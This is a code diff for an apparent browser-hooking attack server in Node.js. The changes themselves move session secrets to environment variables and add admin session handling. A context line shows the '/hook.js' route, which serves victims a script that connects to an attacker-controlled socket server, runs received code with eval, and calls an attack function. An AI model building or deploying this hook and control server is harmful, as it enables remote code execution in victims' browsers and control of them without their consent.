@@ -3,11 +3,15 @@ const http          = require('http'),
       socketio      = require('socket.io'),
       express       = require('express'),
       victimSession = require("express-session")({
-        secret: "my-secret",
+        secret: process.env.VICTIM_SESSION_SECRET,
         resave: true,
         saveUninitialized: true
       }),
       victimIoSession = require("express-socket.io-session"),
+      adminSession    = require("express-session")({
+        secret: process.env.ADMIN_SESSION_SECRET
+      }),
+      adminIoSession  = require("express-socket.io-session"),
       fs              = require('fs'),
       socketIOClient  = fs.readFileSync('./public/socket-io.js')
 
@@ -33,7 +37,7 @@ victimApp.get('/hook.js', function(req, res){
   res.write(`(function(){const socket = io('http://${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
   res.end()
 })
-victimServer.listen( process.env.VICTIM_SOCKET_PORT)
+victimServer.listen(process.env.VICTIM_SOCKET_PORT)
 console.log(`Victim socket server listening on :${process.env.VICTIM_SOCKET_PORT}`)
 
 
@@ -45,7 +49,9 @@ const adminApp = express(),
       adminServer = http.createServer(adminApp),
       ioAdmin = socketio.listen(adminServer)
 
+ioAdmin.use(adminIoSession(adminSession))
 require('./routes/admin/sockets').configure(ioAdmin)
+adminApp.use(adminSession)
 
 process.env.ADMIN_SOCKET_PORT = process.env.ADMIN_SOCKET_PORT
 adminServer.listen( process.env.ADMIN_SOCKET_PORT )
